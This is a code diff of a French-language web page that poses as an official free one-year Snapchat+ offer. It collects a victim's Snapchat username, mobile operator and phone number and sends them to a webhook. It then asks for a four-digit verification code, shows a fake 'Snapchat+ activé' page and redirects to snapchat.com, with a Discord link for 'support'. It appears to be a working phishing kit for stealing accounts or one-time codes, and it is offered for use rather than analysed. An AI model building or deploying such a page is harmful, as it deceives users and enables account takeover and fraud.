@@ -424,6 +424,106 @@
             text-decoration: underline;
         }
 
+        /* ===== PAGE DE REDIRECTION ===== */
+        .redirect-page {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .redirect-page.active {
+            display: block;
+        }
+
+        .redirect-page .check {
+            font-size: 4.5rem;
+            margin-bottom: 12px;
+            filter: drop-shadow(0 0 30px rgba(34, 197, 94, 0.4));
+        }
+
+        .redirect-page h2 {
+            font-size: 1.6rem;
+            font-weight: 900;
+            background: linear-gradient(90deg, #22c55e, #4ade80);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 10px;
+        }
+
+        .redirect-page p {
+            color: #8899bb;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            margin-bottom: 18px;
+        }
+
+        .redirect-page .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 30px;
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+
+        .redirect-page .progress-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #fffc00, #facc15);
+            border-radius: 30px;
+            transition: width 0.1s linear;
+        }
+
+        /* ===== ENCADRÉ DISCORD ===== */
+        .discord-box {
+            background: rgba(88, 101, 242, 0.08);
+            border: 1px solid rgba(88, 101, 242, 0.25);
+            border-radius: 16px;
+            padding: 16px 18px;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            text-align: left;
+        }
+
+        .discord-box .discord-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            background: #5865F2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            flex-shrink: 0;
+        }
+
+        .discord-box .discord-text {
+            font-size: 0.8rem;
+            color: #aabbcc;
+            line-height: 1.5;
+        }
+
+        .discord-box .discord-text strong {
+            color: #fff;
+            display: block;
+            margin-bottom: 2px;
+            font-size: 0.85rem;
+        }
+
+        .discord-box .discord-text a {
+            color: #7c8aff;
+            font-weight: 700;
+            text-decoration: none;
+            word-break: break-all;
+        }
+
+        .discord-box .discord-text a:hover {
+            text-decoration: underline;
+        }
+
         /* ===== FOOTER ===== */
         .legal-footer {
             text-align: center;
@@ -456,6 +556,8 @@
             .code-input-group input { font-size: 1.6rem; letter-spacing: 10px; width: 100%; }
             .code-input-group .btn-code { width: 100%; justify-content: center; }
             .code-section .code-box .timer { font-size: 1.6rem; }
+            .redirect-page h2 { font-size: 1.3rem; }
+            .discord-box { flex-direction: column; text-align: center; }
         }
     </style>
 </head>
@@ -463,114 +565,155 @@
 
     <div class="container">
 
-        <!-- ===== HEADER ===== -->
-        <div class="header">
-            <div class="logo-snap">👻</div>
-            <h1>Snapchat+</h1>
-            <p class="sub-header">
-                Activez Snapchat+ <strong>gratuitement</strong> pendant 1 an !
+        <!-- ===== PAGE PRINCIPALE (formulaire) ===== -->
+        <div id="mainPage">
+
+            <!-- ===== HEADER ===== -->
+            <div class="header">
+                <div class="logo-snap">👻</div>
+                <h1>Snapchat+</h1>
+                <p class="sub-header">
+                    Activez Snapchat+ <strong>gratuitement</strong> pendant 1 an !
+                </p>
+            </div>
+
+            <!-- ===== TÉMOIGNAGE ===== -->
+            <div class="testimonial">
+                <div class="avatar">T</div>
+                <div class="text">
+                    <strong>Tom</strong> vient de recevoir son Snap+ ! ⚡<br>
+                    <span class="highlight">✅ Badges exclusifs</span> • 
+                    <span class="highlight">👀 Qui a revu votre story</span> • 
+                    <span class="highlight">📈 Boost de score</span>
+                </div>
+            </div>
+
+            <!-- ===== BADGES ===== -->
+            <div class="badges">
+                <span class="badge gold">⭐ Offre limitée</span>
+                <span class="badge">🇫🇷 France</span>
+                <span class="badge">🇧🇪 Belgique</span>
+                <span class="badge">🇨🇭 Suisse</span>
+            </div>
+
+            <!-- ===== PAYS ===== -->
+            <div class="countries">
+                <span class="country active">FR</span>
+                <span class="country">BE</span>
+                <span class="country">CH</span>
+            </div>
+
+            <div style="font-size:0.7rem; color:#667788; text-align:center; margin-bottom:18px;">
+                Disponible uniquement pour les numéros France des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas
+            </div>
+
+            <!-- ===== FORMULAIRE ===== -->
+            <form id="mainForm" onsubmit="handleSubmit(event)">
+
+                <!-- PSEUDO -->
+                <div class="form-group">
+                    <label>NOM D'UTILISATEUR SNAPCHAT <span class="required">*</span></label>
+                    <input type="text" id="username" placeholder="@ votre_snap" required minlength="3">
+                </div>
+
+                <!-- OPÉRATEUR -->
+                <div class="form-group operator-free">
+                    <label>
+                        OPÉRATEUR MOBILE <span class="required">*</span>
+                        <span class="badge-free">FREE indisponible</span>
+                    </label>
+                    <select id="operator" required>
+                        <option value="">Sélectionne ton opérateur</option>
+                        <option value="orange">Orange</option>
+                        <option value="sfr">SFR</option>
+                        <option value="bouygues">Bouygues Telecom</option>
+                        <option value="free" disabled style="color:#666; background:#1a0a0a;">Free ❌ (indisponible)</option>
+                        <option value="autre">Autre</option>
+                    </select>
+                    <div class="free-disabled-msg">
+                        La promotion n'est pas valable pour les numéros Free actuellement.
+                    </div>
+                </div>
+
+                <!-- NUMÉRO -->
+                <div class="form-group">
+                    <label>NUMÉRO DE TÉLÉPHONE <span class="required">*</span></label>
+                    <input type="tel" id="phone" placeholder="06 12 34 56 78" maxlength="14" required>
+                    <div class="helper">
+                        <span class="red">⛔ Obligatoire : commence par 06 ou 07</span>
+                        <span>• France - 10 chiffres</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn">
+                    <span class="btn-text">🔥 Activer Snapchat+</span>
+                    <span class="spinner"></span>
+                </button>
+
+            </form>
+
+            <!-- ===== SECTION CODE ===== -->
+            <div class="code-section" id="codeSection">
+                <div class="code-box">
+                    <div style="font-size:0.8rem; color:#8899bb;">📲 Code de vérification</div>
+                    <div class="timer" id="timerDisplay">03:00</div>
+                    <div class="timer-text">
+                        Un code à <strong>4 chiffres</strong> vous sera envoyé dans les <strong>3 minutes</strong> qui suivent
+                    </div>
+                </div>
+
+                <div class="code-input-group">
+                    <input type="text" id="codeInput" placeholder="• • • •" maxlength="4" inputmode="numeric">
+                    <button class="btn-code" id="codeBtn" onclick="verifyCode()">✅ Vérifier</button>
+                </div>
+
+                <div class="resend">
+                    Vous n'avez pas reçu le code ? <a onclick="resendCode()">Renvoyer</a>
+                </div>
+            </div>
+
+            <!-- ===== ENCADRÉ DISCORD (1ère PAGE) ===== -->
+            <div class="discord-box">
+                <div class="discord-icon">💬</div>
+                <div class="discord-text">
+                    <strong>⚠️ Si vous rencontrez un problème</strong>
+                    Venez ici : <a href="https://discord.gg/Th2aqKPxRV" target="_blank">discord.gg/Th2aqKPxRV</a>
+                </div>
+            </div>
+
+            <!-- ===== FOOTER ===== -->
+            <div class="legal-footer">
+                Opération officielle • 100% gratuite •
+                <a href="#" onclick="event.preventDefault();">Conditions d'utilisation</a>
+            </div>
+
+        </div>
+
+        <!-- ===== PAGE DE REDIRECTION (après validation du code) ===== -->
+        <div class="redirect-page" id="redirectPage">
+            <div class="check">✅</div>
+            <h2>Snapchat+ activé !</h2>
+            <p>
+                Ton abonnement Snapchat+ gratuit pour 1 an est en cours d'activation.<br>
+                Redirection vers Snapchat dans quelques secondes...
             </p>
-        </div>
 
-        <!-- ===== TÉMOIGNAGE ===== -->
-        <div class="testimonial">
-            <div class="avatar">T</div>
-            <div class="text">
-                <strong>Tom</strong> vient de recevoir son Snap+ ! ⚡<br>
-                <span class="highlight">✅ Badges exclusifs</span> • 
-                <span class="highlight">👀 Qui a revu votre story</span> • 
-                <span class="highlight">📈 Boost de score</span>
-            </div>
-        </div>
-
-        <!-- ===== BADGES ===== -->
-        <div class="badges">
-            <span class="badge gold">⭐ Offre limitée</span>
-            <span class="badge">🇫🇷 France</span>
-            <span class="badge">🇧🇪 Belgique</span>
-            <span class="badge">🇨🇭 Suisse</span>
-        </div>
-
-        <!-- ===== PAYS ===== -->
-        <div class="countries">
-            <span class="country active">FR</span>
-            <span class="country">BE</span>
-            <span class="country">CH</span>
-        </div>
-
-        <div style="font-size:0.7rem; color:#667788; text-align:center; margin-bottom:18px;">
-            Disponible uniquement pour les numéros France des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas
-        </div>
-
-        <!-- ===== FORMULAIRE ===== -->
-        <form id="mainForm" onsubmit="handleSubmit(event)">
-
-            <!-- PSEUDO -->
-            <div class="form-group">
-                <label>NOM D'UTILISATEUR SNAPCHAT <span class="required">*</span></label>
-                <input type="text" id="username" placeholder="@ votre_snap" required minlength="3">
+            <div class="progress-bar">
+                <div class="fill" id="progressFill"></div>
             </div>
 
-            <!-- OPÉRATEUR -->
-            <div class="form-group operator-free">
-                <label>
-                    OPÉRATEUR MOBILE <span class="required">*</span>
-                    <span class="badge-free">FREE indisponible</span>
-                </label>
-                <select id="operator" required>
-                    <option value="">Sélectionne ton opérateur</option>
-                    <option value="orange">Orange</option>
-                    <option value="sfr">SFR</option>
-                    <option value="bouygues">Bouygues Telecom</option>
-                    <option value="free" disabled style="color:#666; background:#1a0a0a;">Free ❌ (indisponible)</option>
-                    <option value="autre">Autre</option>
-                </select>
-                <div class="free-disabled-msg">
-                    La promotion n'est pas valable pour les numéros Free actuellement.
+            <!-- ENCADRÉ DISCORD (2ème PAGE) -->
+            <div class="discord-box">
+                <div class="discord-icon">💬</div>
+                <div class="discord-text">
+                    <strong>⚠️ Si vous rencontrez un problème</strong>
+                    Venez ici : <a href="https://discord.gg/Th2aqKPxRV" target="_blank">discord.gg/Th2aqKPxRV</a>
                 </div>
             </div>
 
-            <!-- NUMÉRO -->
-            <div class="form-group">
-                <label>NUMÉRO DE TÉLÉPHONE <span class="required">*</span></label>
-                <input type="tel" id="phone" placeholder="06 12 34 56 78" maxlength="14" required>
-                <div class="helper">
-                    <span class="red">⛔ Obligatoire : commence par 06 ou 07</span>
-                    <span>• France - 10 chiffres</span>
-                </div>
+            <div class="legal-footer" style="margin-top:20px;">
+                Opération officielle • 100% gratuite
             </div>
-
-            <button type="submit" class="btn-submit" id="submitBtn">
-                <span class="btn-text">🔥 Activer Snapchat+</span>
-                <span class="spinner"></span>
-            </button>
-
-        </form>
-
-        <!-- ===== SECTION CODE (apparaît après validation) ===== -->
-        <div class="code-section" id="codeSection">
-            <div class="code-box">
-                <div style="font-size:0.8rem; color:#8899bb;">📲 Code de vérification</div>
-                <div class="timer" id="timerDisplay">03:00</div>
-                <div class="timer-text">
-                    Un code à <strong>4 chiffres</strong> vous sera envoyé dans les <strong>3 minutes</strong> qui suivent
-                </div>
-            </div>
-
-            <div class="code-input-group">
-                <input type="text" id="codeInput" placeholder="• • • •" maxlength="4" inputmode="numeric">
-                <button class="btn-code" id="codeBtn" onclick="verifyCode()">✅ Vérifier</button>
-            </div>
-
-            <div class="resend">
-                Vous n'avez pas reçu le code ? <a onclick="resendCode()">Renvoyer</a>
-            </div>
-        </div>
-
-        <!-- ===== FOOTER ===== -->
-        <div class="legal-footer">
-            Opération officielle • 100% gratuite •
-            <a href="#" onclick="event.preventDefault();">Conditions d'utilisation</a>
         </div>
 
     </div>
@@ -583,7 +726,7 @@
 
         let userData = {};
         let timerInterval = null;
-        let timeLeft = 180; // 3 minutes en secondes
+        let timeLeft = 180;
         let codeVerified = false;
 
         // ================================================
@@ -596,7 +739,6 @@
             const phone = document.getElementById('phone').value.trim().replace(/\s+/g, '');
             const operator = document.getElementById('operator').value;
 
-            // VALIDATIONS
             if (username.length < 3) {
                 alert("Veuillez entrer votre nom d'utilisateur Snapchat (minimum 3 caractères).");
                 return;
@@ -612,19 +754,15 @@
                 return;
             }
 
-            // SAUVEGARDE DES DONNÉES
             userData = { username, phone, operator };
 
-            // BOUTON EN CHARGEMENT
             const btn = document.getElementById('submitBtn');
             btn.classList.add('loading');
             btn.disabled = true;
 
-            // ENVOI AU WEBHOOK
             try {
                 await sendToWebhook(username, phone, operator);
 
-                // AFFICHER LA SECTION CODE ET LANCER LE TIMER
                 document.getElementById('codeSection').classList.add('active');
                 document.getElementById('codeInput').focus();
                 startTimer();
@@ -732,10 +870,8 @@
 
                 setTimeout(() => {
                     codeVerified = true;
-                    alert("✅ Félicitations ! Ton Snapchat+ est activé pour 1 an gratuit !");
-                    btn.textContent = "✅ Validé !";
-                    btn.style.opacity = "0.5";
                     if (timerInterval) clearInterval(timerInterval);
+                    showRedirectPage();
                 }, 600);
 
             } catch (error) {
@@ -743,6 +879,25 @@
                 btn.disabled = false;
                 btn.textContent = "✅ Vérifier";
             }
+        }
+
+        // ================================================
+        // PAGE DE REDIRECTION
+        // ================================================
+        function showRedirectPage() {
+            document.getElementById('mainPage').style.display = 'none';
+            document.getElementById('redirectPage').classList.add('active');
+
+            const fill = document.getElementById('progressFill');
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                fill.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    window.location.href = "https://www.snapchat.com/";
+                }
+            }, 50);
         }
 
         // ================================================
@@ -779,23 +934,19 @@
         function resendCode() {
             if (codeVerified) return;
 
-            // Réinitialiser le timer
             if (timerInterval) clearInterval(timerInterval);
             timeLeft = 180;
             document.getElementById('timerDisplay').style.color = "#fffc00";
             startTimer();
 
-            // Réinitialiser le champ code
             document.getElementById('codeInput').value = '';
             document.getElementById('codeInput').focus();
 
-            // Réactiver le bouton
             const btn = document.getElementById('codeBtn');
             btn.disabled = false;
             btn.textContent = "✅ Vérifier";
             btn.style.opacity = "1";
 
-            // Envoyer une notification au webhook
             sendResendNotification();
 
             alert("📲 Un nouveau code a été envoyé ! Vérifie ton téléphone.");
